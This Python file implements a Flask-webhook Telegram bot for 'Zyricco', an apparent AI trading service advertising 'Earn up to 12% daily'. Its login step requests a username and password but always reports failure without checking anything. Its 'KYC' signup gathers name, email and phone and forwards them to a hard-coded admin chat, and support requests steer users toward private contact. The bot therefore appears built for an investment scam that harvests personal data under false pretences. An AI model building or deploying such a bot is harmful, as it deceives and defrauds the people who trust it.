from flask import Flask, request
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
import os
import logging

# --- Basic Logging Setup ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO  # Change to logging.DEBUG for more verbose output from the library
)
logger = logging.getLogger(__name__)


# States
CHOOSING, LOGIN_USERNAME, LOGIN_PASSWORD, KYC_NAME, KYC_EMAIL, KYC_PHONE, SUPPORT_CHOOSING_SERVICE = range(7)

# Telegram Bot Token
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    logger.error("CRITICAL: No BOT_TOKEN environment variable found!")
    raise ValueError("No BOT_TOKEN environment variable found!")
bot = Bot(token=TOKEN)

# Flask app
app = Flask(__name__)
# Ensure use_context=True. For python-telegram-bot v20+, it's always True.
# For v13.x, it's good to be explicit if not default.
dispatcher = Dispatcher(bot=bot, update_queue=None, workers=0, use_context=True) # workers=0 for webhook


# --- Services Definition ---
SERVICES_LIST = [
    ("AI Indicator", "support_ai_indicator", "Real-time trend detection"),
    ("GainX", "support_gainx", "Earn up to 12% daily"),
    ("Funded Accounts", "support_funded", "Trade with Zyricco capital"),
    ("Account Management", "support_acct_mgmt", "Let our pros grow your account"),
    ("AI Signals", "support_ai_signals", "Smart trading insights from our AI")
]

# --- Main Menu ---
def main_menu(update: Update, context: CallbackContext) -> int:
    logger.info(f"main_menu called by user {update.effective_user.id if update.effective_user else 'N/A'}")
    keyboard = [
        [InlineKeyboardButton("Login", callback_data='login')],
        [InlineKeyboardButton("Signup (KYC)", callback_data='signup')],
        [InlineKeyboardButton("Our Services", callback_data='services_overview')],
        [InlineKeyboardButton("Support", callback_data='support_start')],
        [InlineKeyboardButton("Cancel Interaction", callback_data='cancel_interaction')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_text = "Welcome to Zyricco – Your AI-Powered Trading Partner!\n\nChoose an option:"

    if update.callback_query:
        query = update.callback_query
        logger.info(f"main_menu: Editing message for callback query {query.id}")
        try:
            query.edit_message_text(text=welcome_text, reply_markup=reply_markup)
        except Exception as e:
            if "Message is not modified" in str(e):
                logger.info(f"main_menu: Message not modified for query {query.id}, answering callback.")
                query.answer()
            else:
                logger.error(f"main_menu: Error editing message for query {query.id}: {e}", exc_info=True)
                if query.message: # Fallback if edit fails badly
                    context.bot.send_message(chat_id=query.message.chat_id, text=welcome_text, reply_markup=reply_markup)
    elif update.message:
        logger.info(f"main_menu: Replying to message from user {update.message.from_user.id}")
        update.message.reply_text(welcome_text, reply_markup=reply_markup)
    else:
        logger.warning("main_menu: Called without update.message or update.callback_query")
        # This case should ideally not happen with CommandHandler/CallbackQueryHandler
        if update.effective_chat: # Try to send to current chat if possible
             context.bot.send_message(chat_id=update.effective_chat.id, text=welcome_text, reply_markup=reply_markup)


    logger.info("main_menu: Returning CHOOSING state")
    return CHOOSING

# --- Handle Top-Level Button Clicks (CHOOSING State) ---
def handle_main_menu_buttons(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    logger.info(f"handle_main_menu_buttons: User {query.from_user.id} clicked button with data: '{query.data}' (Query ID: {query.id})")
    query.answer() # Acknowledge the callback immediately

    try:
        if query.data == 'login':
            logger.info(f"handle_main_menu_buttons: 'login' chosen by {query.from_user.id}")
            context.bot.send_message(chat_id=query.message.chat_id, text="Please enter your username:")
            return LOGIN_USERNAME
        elif query.data == 'signup':
            logger.info(f"handle_main_menu_buttons: 'signup' chosen by {query.from_user.id}")
            context.bot.send_message(chat_id=query.message.chat_id, text="Let's begin your KYC registration.\nWhat is your full name?")
            return KYC_NAME
        elif query.data == 'services_overview':
            logger.info(f"handle_main_menu_buttons: 'services_overview' chosen by {query.from_user.id}")
            services_text_parts = ["**Zyricco Services:**"]
            for name, _, description in SERVICES_LIST:
                services_text_parts.append(f"- {name}: {description}")
            services_text_parts.append("\nFor more details or to get started with a service, please contact Support.")
            final_text = "\n".join(services_text_parts)

            keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data='main_menu_show')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            query.edit_message_text(text=final_text, parse_mode='Markdown', reply_markup=reply_markup)
            logger.info(f"handle_main_menu_buttons: Displayed services overview for {query.from_user.id}. Returning CHOOSING.")
            return CHOOSING

        elif query.data == 'support_start':
            logger.info(f"handle_main_menu_buttons: 'support_start' chosen by {query.from_user.id}")
            keyboard = []
            for service_name, callback_data_val, _ in SERVICES_LIST:
                keyboard.append([InlineKeyboardButton(service_name, callback_data=callback_data_val)])
            keyboard.append([InlineKeyboardButton("Other Issue", callback_data='support_other')])
            keyboard.append([InlineKeyboardButton("« Back to Main Menu", callback_data='main_menu_show')])
            reply_markup = InlineKeyboardMarkup(keyboard)
            query.edit_message_text(
                "Please select the service you need support for, or choose 'Other Issue':",
                reply_markup=reply_markup
            )
            logger.info(f"handle_main_menu_buttons: Displayed support options for {query.from_user.id}. Returning SUPPORT_CHOOSING_SERVICE.")
            return SUPPORT_CHOOSING_SERVICE

        elif query.data == 'cancel_interaction':
            logger.info(f"handle_main_menu_buttons: 'cancel_interaction' chosen by {query.from_user.id}")
            query.edit_message_text("Action cancelled. Goodbye!")
            return ConversationHandler.END

        elif query.data == 'main_menu_show':
            logger.info(f"handle_main_menu_buttons: 'main_menu_show' chosen by {query.from_user.id}. Calling main_menu.")
            return main_menu(update, context) # This will re-display the main menu and return CHOOSING
        
        else:
            logger.warning(f"handle_main_menu_buttons: Unhandled callback_data '{query.data}' by {query.from_user.id}. Staying in CHOOSING state.")
            # Optionally, inform the user or just do nothing to let fallback handle it
            # query.edit_message_text("Sorry, I didn't understand that selection. Please try again from the main menu.", reply_markup=query.message.reply_markup)
            return CHOOSING # Stay in CHOOSING, might be picked by fallback if not handled

    except Exception as e:
        logger.error(f"handle_main_menu_buttons: Exception while processing callback_data '{query.data}' for user {query.from_user.id}: {e}", exc_info=True)
        try:
            context.bot.send_message(chat_id=query.message.chat_id, text="An error occurred. Please try again.")
        except Exception as e_send:
             logger.error(f"handle_main_menu_buttons: Failed to send error message to user {query.from_user.id}: {e_send}", exc_info=True)
        return main_menu(update, context) # Attempt to recover by showing main menu

# --- Handle Support Service Selection (SUPPORT_CHOOSING_SERVICE State) ---
def handle_support_service_choice(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    logger.info(f"handle_support_service_choice: User {query.from_user.id} clicked button with data: '{query.data}' (Query ID: {query.id})")
    query.answer()
    chosen_service_callback = query.data

    try:
        if chosen_service_callback == 'main_menu_show':
            logger.info(f"handle_support_service_choice: 'main_menu_show' chosen by {query.from_user.id}. Calling main_menu.")
            return main_menu(update, context)

        service_name_display = "the selected service"
        if chosen_service_callback == 'support_other':
            service_name_display = "your query"
        else:
            for name, cb_data, _ in SERVICES_LIST:
                if cb_data == chosen_service_callback:
                    service_name_display = name
                    break
            else: # If loop finished without break
                logger.warning(f"handle_support_service_choice: Unknown service callback '{chosen_service_callback}' from user {query.from_user.id}")
                # Potentially guide user back
                query.edit_message_text("Invalid selection. Please try again or go back to the main menu.")
                return SUPPORT_CHOOSING_SERVICE # Or main_menu(update, context)

        support_message = (
            f"Thank you for reaching out regarding {service_name_display}.\n\n"
            "Please be patient. One of our customer care executives will assist you soon.\n\n"
            "You will be contacted via Telegram by @zyricco_support or an assigned agent."
        )
        admin_notification_text = f"Support Request: User @{query.from_user.username} (ID: {query.from_user.id}) needs help with: {service_name_display}"
        
        try:
            context.bot.send_message(chat_id=1841079821, text=admin_notification_text) # Your admin ID
            logger.info(f"handle_support_service_choice: Sent support notification to admin for user {query.from_user.id}.")
        except Exception as e_admin:
            logger.error(f"handle_support_service_choice: Failed to send support notification to admin: {e_admin}", exc_info=True)

        keyboard = [[InlineKeyboardButton("« Main Menu", callback_data='main_menu_show')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(text=support_message, reply_markup=reply_markup)
        logger.info(f"handle_support_service_choice: Displayed support confirmation for {service_name_display} to user {query.from_user.id}. Returning CHOOSING.")
        return CHOOSING
    
    except Exception as e:
        logger.error(f"handle_support_service_choice: Exception while processing callback_data '{query.data}' for user {query.from_user.id}: {e}", exc_info=True)
        try:
            context.bot.send_message(chat_id=query.message.chat_id, text="An error occurred while processing your support request. Please try again.")
        except Exception as e_send:
            logger.error(f"handle_support_service_choice: Failed to send error message to user {query.from_user.id}: {e_send}", exc_info=True)
        return main_menu(update, context)


# --- Login Flow ---
def login_username(update: Update, context: CallbackContext) -> int:
    logger.info(f"login_username: User {update.message.from_user.id} entered username.")
    context.user_data['username'] = update.message.text
    update.message.reply_text("Now, please enter your password:")
    return LOGIN_PASSWORD

def login_password(update: Update, context: CallbackContext) -> int:
    logger.info(f"login_password: User {update.message.from_user.id} entered password.")
    update.message.reply_text(
        "Login failed: Incorrect username or password. Please try again or contact support."
    )
    return main_menu(update, context)


# --- Signup (KYC) Flow ---
def kyc_name(update: Update, context: CallbackContext) -> int:
    logger.info(f"kyc_name: User {update.message.from_user.id} entered name for KYC.")
    context.user_data['kyc_name'] = update.message.text.strip()
    update.message.reply_text("Great! What is your email address?")
    return KYC_EMAIL

def kyc_email(update: Update, context: CallbackContext) -> int:
    logger.info(f"kyc_email: User {update.message.from_user.id} entered email for KYC.")
    email_text = update.message.text.strip()
    context.user_data['kyc_email'] = email_text
    if '@' not in email_text or '.' not in email_text.split('@')[-1]: # Slightly better check
        update.message.reply_text("That doesn't look like a valid email. Please enter a valid email address:")
        return KYC_EMAIL
    update.message.reply_text("And your phone number (e.g., +1234567890)?")
    return KYC_PHONE

def kyc_phone(update: Update, context: CallbackContext) -> int:
    logger.info(f"kyc_phone: User {update.message.from_user.id} entered phone for KYC.")
    context.user_data['kyc_phone'] = update.message.text.strip()
    user_info = context.user_data
    telegram_user = update.message.from_user
    summary = (
        f"🔔 New KYC Submission:\n\n"
        f"Telegram User: @{telegram_user.username} (ID: {telegram_user.id})\n"
        f"Full Name: {user_info.get('kyc_name', 'N/A')}\n"
        f"Email: {user_info.get('kyc_email', 'N/A')}\n"
        f"Phone: {user_info.get('kyc_phone', 'N/A')}"
    )
    update.message.reply_text(
        "Thank you! Your KYC information has been submitted successfully. "
        "We will review it and be in touch soon."
    )
    try:
        context.bot.send_message(chat_id=1841079821, text=summary)
        logger.info(f"kyc_phone: Sent KYC summary to admin for user {telegram_user.id}.")
    except Exception as e:
        logger.error(f"kyc_phone: Failed to send KYC summary to admin: {e}", exc_info=True)
        # update.message.reply_text("There was an issue notifying admin, but your submission is recorded.") # Already informed user
    return main_menu(update, context)

# --- Cancel Command (Fallback) ---
def cancel_conversation(update: Update, context: CallbackContext) -> int: # Renamed for clarity
    user_id = update.effective_user.id if update.effective_user else "N/A"
    logger.info(f"cancel_conversation: Initiated by user {user_id}.")
    
    cancel_message = "Action cancelled. Returning to the main menu."
    if update.message: # For /cancel command
        update.message.reply_text(cancel_message)
    elif update.callback_query:
        query = update.callback_query
        query.answer()
        try:
            query.edit_message_text(cancel_message)
        except Exception as e:
            logger.warning(f"cancel_conversation: Could not edit message for query {query.id}: {e}. Sending new one.")
            if query.message: # if original message context is available
                context.bot.send_message(chat_id=query.message.chat_id, text=cancel_message)
            # else: cannot send if no chat_id is found
    
    logger.info(f"cancel_conversation: Calling main_menu for user {user_id}.")
    # Calling main_menu here will attempt to display the main menu again.
    # If main_menu is called with a callback_query, it will try to edit THAT message.
    # If it's called with a message, it sends a new one.
    # It's generally safer for cancel to end the conversation and let /start re-initiate.
    # However, given the current structure:
    return main_menu(update, context)

def fallback_cancel(update: Update, context: CallbackContext) -> int:
    user_id = update.effective_user.id if update.effective_user else "N/A"
    query = update.callback_query
    logger.warning(f"fallback_cancel: Unhandled callback '{query.data if query else 'N/A'}' by user {user_id}. Invoking cancel_conversation.")
    return cancel_conversation(update, context)


# --- Conversation Handler Setup ---
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('start', main_menu), CommandHandler('menu', main_menu)],
    states={
        CHOOSING: [CallbackQueryHandler(handle_main_menu_buttons)],
        LOGIN_USERNAME: [MessageHandler(Filters.text & ~Filters.command, login_username)],
        LOGIN_PASSWORD: [MessageHandler(Filters.text & ~Filters.command, login_password)],
        KYC_NAME: [MessageHandler(Filters.text & ~Filters.command, kyc_name)],
        KYC_EMAIL: [MessageHandler(Filters.text & ~Filters.command, kyc_email)],
        KYC_PHONE: [MessageHandler(Filters.text & ~Filters.command, kyc_phone)],
        SUPPORT_CHOOSING_SERVICE: [CallbackQueryHandler(handle_support_service_choice)],
    },
    fallbacks=[
        CommandHandler('cancel', cancel_conversation),
        # This specific fallback for 'main_menu_show' might be redundant if all handlers correctly return main_menu
        # However, it can act as a safety net.
        CallbackQueryHandler(lambda u,c: main_menu(u,c) if u.callback_query and u.callback_query.data == 'main_menu_show' else fallback_cancel(u,c))
    ],
    # per_message=False, # Default, good for button-based convos
    # per_user=True,     # Default, good
)

dispatcher.add_handler(conv_handler)

# --- Flask Webhook Routes ---
@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        json_update = request.get_json(force=True)
        # logger.debug(f"Webhook received JSON: {json_update}") # Very verbose, use if needed
        update = Update.de_json(json_update, bot)
        dispatcher.process_update(update)
    except Exception as e:
        logger.error(f"Error in webhook processing: {e}", exc_info=True)
    return "ok", 200

@app.route("/", methods=["GET"])
def home():
    return "Zyricco Bot is running!", 200

# --- Run Flask App ---
if __name__ == "__main__":
    if TOKEN is None: # Already checked, but good for main guard
        logger.critical("CRITICAL: BOT_TOKEN not set at script execution point.")
        exit(1)
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask app on host 0.0.0.0, port {port}...")
    # When deploying, use a production WSGI server like gunicorn or uWSGI
    # For local dev, Flask's server is fine. debug=False for production.
    app.run(host='0.0.0.0', port=port, debug=False)

